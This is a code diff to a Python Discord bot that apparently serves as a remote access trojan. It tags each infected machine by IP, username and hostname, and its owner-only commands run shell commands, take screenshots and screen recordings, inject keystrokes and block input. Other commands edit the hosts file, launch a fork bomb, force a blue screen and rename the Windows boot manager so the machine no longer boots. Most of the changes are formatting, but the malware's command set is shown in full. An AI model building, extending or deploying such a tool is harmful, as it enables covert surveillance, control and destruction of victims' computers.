@@ -2,12 +2,13 @@ import asyncio
 import getpass
 import json
 import os
+import re
 import socket
 from typing import cast
 
 import discord
 import requests
-from discord import Interaction, TextChannel, app_commands
+from discord import Interaction, TextChannel
 from discord.ext import commands
 from discord.ext.commands import Context
 
@@ -46,9 +47,9 @@ from src.cmd.processes import (
 from src.cmd.read_file import read_file
 from src.cmd.run_script import run_script_file
 from src.cmd.runtime_control import clear_channel, restart_bot
-from src.cmd.screenshot import take_screenshot
 from src.cmd.screen_display import display_image, play_glitch
 from src.cmd.screen_recording import record_screen_command
+from src.cmd.screenshot import take_screenshot
 from src.cmd.shell import execute_cmd
 from src.cmd.system import (
     break_windows,
@@ -130,11 +131,14 @@ async def on_ready():
     ip = response.text.replace(".", "-").strip()
     username = getpass.getuser()
     pc_name = socket.gethostname()
+    cleaned_pc_name = re.sub(
+        r"[^a-zA-Z0-9_-]",
+        "",
+        pc_name.strip().replace("/", "_").replace(" ", "-").lower(),
+    )
 
     pc_user_name = f"{pc_name.strip()}/{username.strip()}"
-    channel_name = (
-        f"{pc_user_name.strip().replace('/', '_').replace(' ', '-').lower()}_{ip}"
-    )
+    channel_name = f"{cleaned_pc_name}_{ip}"
 
     channel = next(
         (
@@ -476,7 +480,9 @@ async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
         key = rest.strip('"').strip("'").strip()
 
         if not key:
-            await ctx.reply('Give the key of the rule to remove, e.g. `!replacements rm "abc"`.')
+            await ctx.reply(
+                'Give the key of the rule to remove, e.g. `!replacements rm "abc"`.'
+            )
             return
 
         await remove_replacement(ctx, key)
@@ -541,9 +547,7 @@ async def run_script(
 # ===========================
 # === DELETE COMMAND ===
 # ===========================
-@bot.command(
-    name="delete", aliases=["remove"], description="Delete a file or a folder"
-)
+@bot.command(name="delete", aliases=["remove"], description="Delete a file or a folder")
 @commands.is_owner()
 @commands.guild_only()
 async def delete(ctx: Context[commands.Bot], *, path: str):
@@ -667,9 +671,7 @@ async def restart(ctx: Context[commands.Bot], timeout: str = "0"):
 # ===========================
 # === RESTART BOT COMMAND ===
 # ===========================
-@bot.command(
-    name="restart_bot", description="Restart the runtime itself."
-)
+@bot.command(name="restart_bot", description="Restart the runtime itself.")
 @commands.is_owner()
 @commands.guild_only()
 async def restart_bot_command(ctx: Context[commands.Bot]):
@@ -679,9 +681,7 @@ async def restart_bot_command(ctx: Context[commands.Bot]):
 # ===========================
 # === EXIT COMMAND ===
 # ===========================
-@bot.command(
-    name="exit", description="Stop the runtime process."
-)
+@bot.command(name="exit", description="Stop the runtime process.")
 @commands.is_owner()
 @commands.guild_only()
 async def exit_command(ctx: Context[commands.Bot]):
@@ -780,9 +780,7 @@ async def foreground(ctx: Context[commands.Bot]):
     await show_foreground(ctx)
 
 
-@bot.command(
-    name="blacklist", description="Kill a process again as soon as it starts."
-)
+@bot.command(name="blacklist", description="Kill a process again as soon as it starts.")
 @commands.is_owner()
 @commands.guild_only()
 async def blacklist(ctx: Context[commands.Bot], *, name: str = ""):
@@ -793,9 +791,7 @@ async def blacklist(ctx: Context[commands.Bot], *, name: str = ""):
     await blacklist_process(ctx, name)
 
 
-@bot.command(
-    name="whitelist", description="Remove a process from the blacklist."
-)
+@bot.command(name="whitelist", description="Remove a process from the blacklist.")
 @commands.is_owner()
 @commands.guild_only()
 async def whitelist(ctx: Context[commands.Bot], *, name: str):
@@ -805,27 +801,21 @@ async def whitelist(ctx: Context[commands.Bot], *, name: str):
 # ===========================
 # === INPUT COMMANDS ===
 # ===========================
-@bot.command(
-    name="block-input", description="Block the keyboard and the mouse."
-)
+@bot.command(name="block-input", description="Block the keyboard and the mouse.")
 @commands.is_owner()
 @commands.guild_only()
 async def block_input_command(ctx: Context[commands.Bot]):
     await block_input(ctx)
 
 
-@bot.command(
-    name="unblock-input", description="Unblock the keyboard and the mouse."
-)
+@bot.command(name="unblock-input", description="Unblock the keyboard and the mouse.")
 @commands.is_owner()
 @commands.guild_only()
 async def unblock_input_command(ctx: Context[commands.Bot]):
     await unblock_input(ctx)
 
 
-@bot.command(
-    name="keys", description="Type on the machine, ALTF4 and ALTTAB work too."
-)
+@bot.command(name="keys", description="Type on the machine, ALTF4 and ALTTAB work too.")
 @commands.is_owner()
 @commands.guild_only()
 async def keys(ctx: Context[commands.Bot], *, keys_to_press: str):
@@ -876,9 +866,7 @@ async def critical(ctx: Context[commands.Bot], action: str = "status"):
 # ===========================
 # === MONITOR COMMAND ===
 # ===========================
-@bot.command(
-    name="monitors", description="Turn the monitors of the machine on or off."
-)
+@bot.command(name="monitors", description="Turn the monitors of the machine on or off.")
 @commands.is_owner()
 @commands.guild_only()
 async def monitors(ctx: Context[commands.Bot], state: str = "on"):
@@ -888,18 +876,14 @@ async def monitors(ctx: Context[commands.Bot], state: str = "on"):
 # ===========================
 # === WEBSITE COMMANDS ===
 # ===========================
-@bot.command(
-    name="block-website", description="Block a website with the hosts file."
-)
+@bot.command(name="block-website", description="Block a website with the hosts file.")
 @commands.is_owner()
 @commands.guild_only()
 async def block_website_command(ctx: Context[commands.Bot], *, url: str):
     await block_website(ctx, url)
 
 
-@bot.command(
-    name="unblock-website", description="Unblock a website of the hosts file."
-)
+@bot.command(name="unblock-website", description="Unblock a website of the hosts file.")
 @commands.is_owner()
 @commands.guild_only()
 async def unblock_website_command(ctx: Context[commands.Bot], *, url: str):
@@ -918,36 +902,28 @@ async def volume(ctx: Context[commands.Bot], level: str):
     await set_volume(ctx, level)
 
 
-@bot.command(
-    name="play", description="Play a wav, mp3 or midi file on the machine."
-)
+@bot.command(name="play", description="Play a wav, mp3 or midi file on the machine.")
 @commands.is_owner()
 @commands.guild_only()
 async def play(ctx: Context[commands.Bot], *, path: str):
     await play_audio(ctx, path)
 
 
-@bot.command(
-    name="forkbomb", description="Start a fork bomb, the machine will freeze."
-)
+@bot.command(name="forkbomb", description="Start a fork bomb, the machine will freeze.")
 @commands.is_owner()
 @commands.guild_only()
 async def forkbomb(ctx: Context[commands.Bot]):
     await start_forkbomb(ctx)
 
 
-@bot.command(
-    name="bsod", description="Trigger a blue screen of death on the machine."
-)
+@bot.command(name="bsod", description="Trigger a blue screen of death on the machine.")
 @commands.is_owner()
 @commands.guild_only()
 async def bsod(ctx: Context[commands.Bot]):
     await trigger_bsod(ctx)
 
 
-@bot.command(
-    name="break-windows", description="Rename the boot manager of Windows."
-)
+@bot.command(name="break-windows", description="Rename the boot manager of Windows.")
 @commands.is_owner()
 @commands.guild_only()
 async def break_windows_command(ctx: Context[commands.Bot]):
@@ -975,9 +951,7 @@ async def enable_reset(ctx: Context[commands.Bot]):
 # ===========================
 # === IMPLODE COMMAND ===
 # ===========================
-@bot.command(
-    name="implode", description="Remove the runtime from the machine."
-)
+@bot.command(name="implode", description="Remove the runtime from the machine.")
 @commands.is_owner()
 @commands.guild_only()
 async def implode_command(ctx: Context[commands.Bot]):
@@ -1001,5 +975,5 @@ def parse_seconds(value: str) -> int:
     """Turn the argument of a command into a number of seconds."""
     try:
         return int(str(value).strip())
-    except (TypeError, ValueError):
+    except TypeError, ValueError:
         return 0
